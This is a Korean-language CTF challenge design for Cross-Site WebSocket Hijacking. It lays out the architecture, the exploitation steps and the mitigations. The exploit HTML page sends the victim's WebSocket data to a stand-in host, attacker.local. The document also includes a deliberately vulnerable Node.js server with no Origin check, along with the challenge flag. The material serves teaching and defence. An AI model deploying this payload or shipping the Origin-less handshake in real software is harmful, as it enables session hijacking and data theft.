---
title: Cross-Site WebSocket Hijacking (CSWSH) — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, websocket, cswsh, csrf, origin-bypass, client-side]
confidence: high
---

# Cross-Site WebSocket Hijacking (CSWSH) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Live Collaboration Hub (실시간 공동 작업 공간)
- **난이도**: Medium-High
- **핵심 컨셉**: 웹소켓 프로토콜 연결 수립 단계의 검증 오류를 악용하는 **크로스 사이트 웹소켓 하이재킹(CSWSH)** 취약점 문제입니다. 대상 애플리케이션은 실시간 주식 및 대시보드 상태 동기화를 위해 웹소켓(`ws://` 또는 `wss://`) 프로토콜을 사용하며, 사용자의 세션을 브라우저의 일반 쿠키 인증에 의존하여 검증합니다. 그러나 웹소켓 핸드셰이크(HTTP Upgrade) 단계에서 클라이언트가 전달한 **`Origin` 헤더**에 대한 타당성을 전혀 검증하지 않습니다. 공격자는 악성 웹사이트를 개설하여 피해자가 이 사이트를 방문하게 유도하고, 피해자의 쿠키 세션을 담아 대상 서버로 웹소켓 연결을 직접 체결해 기밀 데이터가 가득한 실시간 메일링/로그 데이터를 공격자 사이트로 가로챕니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **WebSocket Gateway Service (`/ws`)**:
  - 클라이언트가 웹소켓 연결을 요청할 때 인증 쿠키(`session`)를 파싱하여 해당 유저의 채널을 개방해 줍니다.
  - 핸드셰이크 요청 처리 미들웨어에서 `Origin` 헤더 체크 부재.
- **Flag 위치**:
  - 관리자 봇(Admin Bot)이 접속해 있는 세션을 하이재킹하여 웹소켓 채널을 유지한 상태에서, 관리자 전용 채널로 송신되는 실시간 기밀 데이터 브로드캐스트 내에 플래그가 전송됩니다.

### 2.2 취약점 지점
1. **No Origin Validation in WebSocket Handshake**:
   - 웹소켓은 동일 출처 정책(Same-Origin Policy)이 자동으로 적용되지 않는 프로토콜입니다. 따라서 임의의 제3의 출처(도메인)에서 대상 서버로의 웹소켓 연결이 완전 차단되지 않습니다.
   - 서버 측에서 핸드셰이크 수립 시 `req.headers.origin`이 신뢰 도메인인지 검사하는 화이트리스트 루틴이 누락되었습니다.
2. **Cookie-based Websocket Authentication**:
   - 브라우저는 외부 도메인의 악성 스크립트에 의해 요청이 유발되더라도, 타겟 도메인의 세션 쿠키를 HTTP 핸드셰이크 요청 패킷에 자동으로 동봉(SameSite 설정이 해제되어 있거나 `None`일 때)하는 특징이 있습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 프로토콜 | 인증 방식 | 요청 헤더 | 검증 상태 |
|------------|----------|-----------|-----------|-----------|
| `/ws` | HTTP Upgrade to WS | Cookie (`session`) | `Origin: http://attacker.local` | `Origin` 헤더 미검증 (CSWSH 가능) |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 웹소켓 핸드셰이크 구조 확인
공격자는 웹소켓 연결 과정을 브라우저 개발자 도구의 Network 탭에서 확인합니다.
- **핸드셰이크 요청 예시**:
  ```http
  GET /ws HTTP/1.1
  Host: collab.challenge.local
  Upgrade: websocket
  Connection: Upgrade
  Cookie: session=admin_cookie_val_xyz
  Origin: http://collab.challenge.local
  ```
- 이 연결 과정에서 별도의 CSRF 토큰이나 Authorization 헤더가 사용되지 않고 오직 `Cookie`에 의해서만 웹소켓 유저 인증이 처리되고 있음을 분석합니다.

### Step 2. Cross-Origin 연결 테스트
1. 공격자는 자신의 서버(`http://attacker.local`)에서 로컬 스크립트로 대상 웹소켓 엔드포인트에 접속을 시도해 봅니다.
   - **테스트 스크립트**:
     ```javascript
     const ws = new WebSocket("ws://collab.challenge.local/ws");
     ws.onopen = () => console.log("Connected Successfully from Cross-Origin!");
     ```
2. 응답으로 `101 Switching Protocols`를 정상 획득하고 데이터를 주고받을 수 있음을 인지하여 CSWSH 취약점이 성립함을 최종 판별합니다.

### Step 3. 하이재킹 악성 스크립트가 담긴 익스플로잇 페이지 구축
피해자 관리자 봇이 접속하도록 유도할 악성 HTML 페이로드(`exploit.html`)를 작성합니다.
- **공격 HTML (`exploit.html`)**:
  ```html
  <!DOCTYPE html>
  <html>
  <head><title>Free Gift!</title></head>
  <body>
      <script>
          // 피해자의 쿠키 세션을 사용하여 대상 웹소켓 서버로 연결 수립
          const ws = new WebSocket("ws://collab.challenge.local/ws");
          
          ws.onmessage = function(event) {
              const data = event.data;
              // 수신된 실시간 데이터를 공격자 리시버로 송출
              fetch('http://attacker.local/log?data=' + encodeURIComponent(data));
          };
          
          ws.onopen = function() {
              // 필요할 경우 웹소켓 채널에 명령어를 주입하여 데이터 발송을 유도
              ws.send(JSON.stringify({ action: "get_admin_logs" }));
          };
      </script>
  </body>
  </html>
  ```

### Step 4. flag 획득
1. 관리자 봇에게 `http://attacker.local/exploit.html` 링크를 리포트합니다.
2. 관리자 봇의 브라우저에서 스크립트가 돌아가면, 봇의 세션 쿠키가 실려 `collab.challenge.local/ws`로 교차 도메인 소켓이 성립됩니다.
3. 관리자용 기밀 메시지 브로드캐스트가 동작하고, 이 데이터를 자바스크립트가 가로채 `attacker.local`로 발송합니다.
4. 공격자는 수집한 데이터 본문에서 플래그(`FLAG{cross_site_websocket_hijacking_origin_bypass}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js + ws 라이브러리)

```javascript
// server.js (취약한 Node.js ws 패키지 연동 예시)
const http = require('http');
const WebSocket = require('ws');
const cookie = require('cookie');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Websocket Server');
});

const wss = new WebSocket.Server({ noServer: true });

// HTTP Upgrade 요청 발생 시 인증 수행
server.on('upgrade', (req, socket, head) => {
    const cookies = cookie.parse(req.headers.cookie || '');
    const sessionToken = cookies.session;

    // 인증 검증
    if (!sessionToken) {
        socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
        socket.destroy();
        return;
    }

    // 취약점 지점: Origin 헤더에 대한 어떠한 검증 및 차단 규칙도 존재하지 않음
    // 클라이언트 브라우저가 보낸 Origin 헤더를 무시하고 무조건 쿠키 인증만 통과하면 업그레이드 수락
    const origin = req.headers.origin; 
    console.log(`[HANDSHAKE] Origin: ${origin} Connection Allowed`);

    wss.handleUpgrade(req, socket, head, (ws) => {
        wss.emit('connection', ws, req);
    });
});

wss.on('connection', (ws, req) => {
    // 실시간 비밀 채널 데이터 정기 발송
    const interval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
                type: "system_update",
                content: "Secret flag: FLAG{cross_site_websocket_hijacking_origin_bypass}"
            }));
        }
    }, 2000);

    ws.on('close', () => {
        clearInterval(interval);
    });
});

server.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **핸드셰이크 단계의 Origin 검증 (Strict Origin Whitelisting)**:
   - 웹소켓 서버 코드는 업그레이드 수립 직전, HTTP 요청 헤더의 `Origin` 값을 명확히 체크하여 사전에 정의된 도메인(예: `collab.challenge.local`)과 정확히 1대1 매칭되거나 신뢰 그룹 도메인에 속하는 경우에만 소켓 개방을 수락하도록 구현합니다.
     ```javascript
     if (req.headers.origin !== 'http://collab.challenge.local') {
         socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
         socket.destroy();
         return;
     }
     ```
2. **SameSite 쿠키 속성 설정**:
   - 사용자 세션 쿠키 발급 시 `SameSite=Lax` 또는 `SameSite=Strict` 속성을 반드시 명시하여, 타 도메인에서 교차 요청으로 전달되는 웹소켓 핸드셰이크 요청에 세션 쿠키가 포함되어 발송되는 일을 근본적으로 무력화합니다.
3. **티켓 기반 인증 모델 차용 (Ticket-Based Authentication)**:
   - 쿠키에 의존하지 않고, 일반 HTTP 요청을 통해 만료 시간이 매우 짧은 일회성 일치 토큰(Ticket)을 클라이언트가 먼저 받아내도록 유도한 뒤, 웹소켓 연결 쿼리스트링(`ws://...?ticket=xxx`)에 실어서 보내 검증하는 방식을 채택합니다.
